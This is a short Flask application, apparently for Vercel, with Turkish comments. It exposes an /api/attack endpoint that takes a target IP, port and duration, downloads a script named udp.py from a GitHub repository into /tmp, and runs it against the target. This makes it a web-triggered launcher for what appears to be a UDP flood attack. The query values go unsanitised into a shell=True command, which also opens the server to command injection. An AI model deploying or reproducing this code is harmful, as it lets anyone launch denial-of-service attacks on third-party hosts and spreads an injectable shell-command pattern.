from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/api/attack')
def attack():
    target = request.args.get('ip')
    port = request.args.get('port', '80')
    duration = request.args.get('time', '10')

    if target:
        # Vercel'de /tmp dışında bir yere dosya yazamazsın
        cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
        subprocess.Popen(cmd, shell=True)
        return f"🚀 Edge Saldirisi {target} Hedefine Baslatildi!", 200
    return "❌ Hata: IP adresi eksik!", 400

# Vercel bu değişkeni arıyor
app = app
